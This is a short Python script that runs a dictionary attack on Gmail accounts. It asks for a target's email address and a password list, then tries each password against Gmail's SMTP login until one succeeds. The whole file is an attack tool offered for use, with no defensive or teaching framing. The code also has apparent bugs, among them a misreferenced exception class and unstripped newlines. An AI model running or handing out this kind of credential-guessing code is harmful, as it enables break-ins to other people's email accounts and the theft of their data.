import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("Entre the target's email addess: ")
passwfile = raw_input("Entre the pass file name: ")
passwfile = open(passwfile, "r")

for password in passwfile:
    try:
        smtpserver.login(user, password)

        print ('[+] Password found: %s') % password
        break;

    except smtpserver.SMTPAuthenticationError:
        print ("[!] Password Incorrect: %s") % password